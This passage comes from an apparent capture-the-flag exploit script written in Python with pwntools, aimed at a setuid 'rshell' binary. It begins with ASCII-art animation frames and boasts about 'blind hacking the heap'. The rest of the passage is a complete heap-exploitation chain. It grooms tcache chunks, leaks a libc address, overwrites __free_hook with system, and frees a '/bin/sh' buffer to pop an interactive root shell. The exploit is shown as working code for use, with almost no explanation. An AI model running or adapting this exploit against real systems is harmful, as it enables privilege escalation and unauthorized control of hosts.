					$#*+?+:*..*/-,.           ,:+:-*----*..*--------**-----*-***,..****-::,-+???+*#$
					$#?+++-,  ***.            ,:+//+++++-,,-+++++++++++++++++++/*.,:++++?:,-+?+?+*#$
					$#?++/-,  ,:,.            ,:++//+++/-,,-+++++++++++++++++++/*.,:+///+:,*/++++?#$
					$#?++/-,**-:,...        ...*-------:-,,-/++++++++++++++++++/*.,:+///+:,*/++++?#$
					$$?++/-,-+/:,...             .....*:-,,-/+/++++++++++/////+/*.,:+///+:,*/+++/?#@
					$#?++/-,-/+*:-*,,,,,,,,,,,,,***,..*:-,,-//////////////////+/*.,:+///+!,*/+++/?#@
					$#?++/-,-::-*,*,,,,,*,,,,,,*:/^-..,:-,,-///////////////////^*.,:////+*,,^////?#$
					$#?///:*****-::::::---::::::;//-,.,:-,,-^/^//////////^^////^*.,://^/+*,,*///^+#$
					$#?/^//^^^^^///^::-,,-^/^*^^*//-,.,:-,,-^/^^^^^^^^^^^^^^///^*.,://^/+*,,*/^^^+#$
					$#+/^^^^^*^^::--::-,.*:^*****//-,.,:-,,-^^^^^^^^^^^^^^^^^^/**.,:/^^^+!,,*/^^^+#$
					$#?^^*^^^^^*::!///-..,-*^****^^-..,--,,-^^*^^^^^^^^^^***^^/**.,:/^*^+!,,*/^^^+#$
					$#?^^*^^^^^*^***^^-..,-!**!**^^-..,:-,,-^^^^^^^^^*******^^/**.,:^**^+!,,*/^^*+#$
					$#+^^*******^*^/^*-,.,-!*!!**//-..,:-,.-^^*^^^^^*********^^**.,:^**^/!,,!^*^*+#$
					$#+^********--*********--**-*/^-..,--,,-^^*^^^^^**********^**.,:****/;,,!^***+#$
					$$#/*!!!!!**:--::::::::::--:**!-**-::-*-!!!!!!!!!!!!!!!***^!-*-:*!!**:**;***^#$@
					@$#/!!!!!!!!:**:*!:**:!*:**:!!**!**!!***!!!!!!!;;;;;;;!!!!!!!!!!!;!!!!;!****+#$$
					@$#+*!!!;;;;!!!!!!!;;!!!!!!*!!;!;;!;;!!!!!!!!!!!!!!!!!!!!!!!!!!!;!!!!!!!!!!*+#$$
					$$$#/!!;;;;;;!;;;;;;;;;;;;;;;;;;;;;;;;!!;;;;!;!;;;;;;;;;;;;;;;;;;;!!;;!!;!!/#$$@
					@@@$##/!;;;;!!;:;;:::;;;;;;;;:::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!!!;:;;!^##$@@@
					@@@@$$##/*!!!;;;;;;;:;;;;;;;;;;;;;::::;;;;;;;;;;:::::::::::::;;;;;;!!!*/##$@@@@@
					@@@@@@@$$#####*^***************************^^^^*****************/&#####$$@@@@@@@
					@@@@@@@@@@$@@$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$@@$@@@@@@@@@@
					""", """\n\n\t\t\t\t\t\t\t\t\t\t  Now watch me blind hacking the heaP

					%%%%%%%@$$$##########################################$###############$$$@%%%%%%%
					%%%%@@$#########&8&&&888888888##88#8888888888888###########88###8888#####$$@%%%%
					@@@@$####88&&888&&&&&&&&&888&&&&8888888888888888888888888888888888&&&888###$@%%%
					%@$$#&&888888888&&&&&&&8#?:-****-:?#88888888888888888888888############8&8##$$%%
					%@$##&&888888888&&&&&&&&:*........*-&##8888888888888888888888&&&&&&&&&8&&88##$@%
					@$$##888888888888&&&&#&:,....   ...,:#&*&&&&&&&&&&&&&&####88&&&&&&&&&&&&&&8##$$@
					@$##8&&&&&&&&&&&&&&&&&?-,..      ...-?*&&&&&&&&&&&&&^-:::::*?*&&&&&&&&&8&&&&##$@
					@$#&&&&&&&&&&&&&&****&8!*..       .,:*&********&**&&:,. ....,,,**--&8*&&&&&&&#$@
					@$#&&&**************&*:::*,...  ..*:?**************&:,           .*+8********#$@
					@$#*************?&?:*,..,----**--:+#**?*************:,          ..,-:?*?**?**#$@
					@$#*********?*?*&/-,......,:&??**&***???*********?**:,           .,*,:**???**#$@
					@$#***?*??*??*?*;*........,-**?&*******??****???????^----:-*.  ,::+/*,!&*??**#$@
					@$#*???:*:?*???;*....   ...,;+???*??????**??????????!:::!!:-.. *:::/:,-?*??**#$@
					$$#????-,,!*??**.  ..      .-+&?????+??***????????*;,......     ..,:!,*?*????&$@
					@$#??*?-,.-?&?-.   ..      .,--::::::::-------***::-,           ...*:*,**????*$@
					@$#????-,.*??:,.          .---**,,..............,*-****************-,,,:?????*$$
					@$&????-..*+**.           ,:?:-*******************-**************-*-:-,-?????*$$
					$$*???:*. */-,.           ,:?:-*----*..**-------*****----*-*,..****-::,-+????*$@
					$$?+++-,  ,**.            ,:++++++++-,,-++++++++++++++++++?+*.,:++++?:,-+????*$@
					$$?++/-,  ,:,             ,:++//?+++-,,-++++++++++++++++++?/*.,:+//++:,*/??++?$@
					$$*++/-,**-:,...         ..*-------:-,,-+++++++++++++++++++/*.,:+///+:,*/++++?$@
					@$*++/-,-+/:,..             ......,--,,-+++++++++++++++++++/*.,:+//++:,*/++++?$@
					@$*++/-,-/?*:-*,,,,,,,,,,,,,***,..,:-,,-++//////++++//////+/*.,:+///+!,*/++++?$@
					@$?++/-,-::-*,*,,,,,,,,,,,,*://-,.,:-,,-//////////////////+^*.,:+///+*,,^+///?$@
					@$?+//:*****-:::::----::::::;//-,.,:-,,-^/^////////////////^*.,:+///+*,,*////?$@
					$$?/^//^^^^//+/*::-,,-//^^^^*//-..,:-,,-^/^//////////^/////^*.,://^/+*,,*///^+$@
					$$?/^^^^^*^^::--::-,.*:^^**^*//-..,--,,-^^^/////^^^^^^^^^^/^*.,:/^^/+!,,*/^^^+$@
					$$?/^^^^^^^*::*///-..,-*^****^^-..,--,.-^^^^^^^^^^^^^*^^^^/**.,:/^^^+*,,*/^^^+$$
					$$?/^^^^^^^*^***^^-..,-!*****^^-..,--,.-^^^^^^^^^^^^^**^^^^**.,:^**^+!,,*/^^^+$$
					$$?^********^*^/^*-,.,-!*!!**//-..,--,.-^^^^^^^^^^*****^^^^**.,:^**^/!,,!^^^*+$$
					@$?^****!***--**********-**-*/^-..,--,.-*^*^^^^^*********^^**.,:****/;,,!^***+$$
					@$#^*!!!!!!*:--::::::::::--:***-***--**-*!!!!!!!!!!!!!!****!-*-:*!!**:**;***^#$@
					@$$+*!!*!!!!:**:*!:**:!*:**:*!*!!!*!****!!;;;!!!!!!!!!!!!!!*!!!!!;!!!!;!****?$$@
					@$$?*;;!!!;!!!!!!!!;;!!!!!!*!!!!!;!!;!!!!!!!!!!!!!!!!!!!!!!!!!!!;;!!!!*!!!!*+$$$
					@@$$+!!;;;;;!!;;;;;;;;;;;;;!;;;:;;;;;;!;;;;;;;;;;;;;;;;;;;;;;;;;;;!!;;!!!!!/$$@@
					%%@@$#^!;;;;!;;;;;::::::::::::::;;;;;;;;;;;;;;;;;;;;;;::::;;;;;;;;!!;:;;!^#$$@%@
					%%@@$$$#/*!!;;;;;;;:;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::::::::;;;:;;;!!!;!*/#$$@@%@@
					@@@@@%@@$$####*/**************************^^^^^^^*^*^*^*^*^****^/&####$$@@%%%@@@
					%%@@@%%@@@@@@@$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$@@@$@@@@@@@@@%"""]
							


scene_counter = 0
while True:
	# p = remoteShell.run('./RopeTwo/rshell')
	p = remoteShell.run('/usr/bin/rshell')

	libc_leak = ""

	def waitshell():
		global scene
		global scene_counter
		p.recvuntil('$')
		scene.status(animarr[scene_counter])
		if(scene_counter == len(animarr) - 1):
			scene_counter = 0
		else:
			scene_counter = scene_counter + 1


	def wait():
		global scene
		global scene_counter
		p.recvuntil(':')
		scene.status(animarr[scene_counter])
		if(scene_counter == len(animarr) - 1):
			scene_counter = 0
		else:
			scene_counter = scene_counter + 1

	def add(name, size, content=""):
		p.sendline("add " + name)
		wait()
		p.sendline(str(size))
		wait()
		p.sendline(content)
		waitshell()

	def leak(name, size, content=""):
		global libc_leak
		p.sendline("add " + name)
		wait()
		p.sendline(str(size))
		wait()
		p.sendline(content)
		libc_leak = p.recvrepeat(1)
		

	def edit(name, size, content=""):
		p.sendline("edit " + name)
		wait()
		p.sendline(str(size))

		if(size != 0):
			wait()
			p.send(content)
		
		waitshell()

	def rm(name):
		p.sendline("rm " + name)
		waitshell()

	waitshell()

	for i in range(1, 3):
		add("1", 90, "AAAA") 
		edit("1", 40, "BBBB")
		rm("1")

	add("1", 50, p64(0x81)*3)
	edit("1", 50, p64(0x81)*4)
	rm("1")

	add("1", 110)
	add("2", 110)
	rm("2")
	rm("1")


	for i in range(1, 10):
		add("1", 90, p64(0x31)*10)
		edit("1", 50, p64(0x31))
		rm("1")


	add("1", 110)
	add("2", 110)

	rm("2")

	edit("1", 0)
	edit("1", 110, '\x20')


	add("2", 110)
	edit("2", 80, "AAAA")
	rm("2")


	add("2", 110, p64(0x00)*3 + p64(0x431))

	rm("1")
	edit("2", 110, p64(0x00)*3 + p64(0x81) + p16(0x3758))
	
	rm("2")
	add("2", 80)
	edit("2", 50, "TRASH")
	rm("2")

	
	try:
		payload = "/bin/sh\x00\x00\x18\xad\xfb\x00\x00\x00\x00" + "\x00"*24
		leak("2", 80, payload)
	except:
		pass

	if(len(libc_leak) < 200):
		continue
	
	print("")
	print("\t\t\t\t\t\t\t\t\t\t\t\t\t   !!!! SUCCESS !!!!")
	addr = u64(libc_leak[-77:-69])
	print("\t\t\t\t\t\t\t\t\t\t\t\t   GOT LEAK: " + hex(addr))
	libc.address = addr - 0x1e57e3
	print("\t\t\t\t\t\t\t\t\t\t\t\t   Libc at: " + hex(libc.address))
	print("\t\t\t\t\t\t\t\t\t\t\t\t   Free at: " + hex(libc.symbols['__free_hook']))
	print("\t\t\t\t\t\t\t\t\t\t\t\t   System at: " + hex(libc.symbols['system']))
	print("\t\t\t\t\t\t\t\t\t\t\t\t!!! go get the r00t now boy !!!")
	print("")

	add("1", 110, p64(0x00)*3 + p64(0x41) + p64(libc.symbols['__free_hook'] - 0x10))
	rm("1")

	for t in range(1, 9):
		add("1", 50)
		edit("1", 10, "XXXX")
		rm("1")

	add("1", 50, p64(libc.symbols['system']))


	break

rm("2")
p.recvrepeat(0.4)
p.sendline("id")
idstr = p.recvrepeat(0.4)
print("")
print("\t\t\t\t\t\t\t\t\t" + str(idstr)[:-3])
print("")


p.interactive()
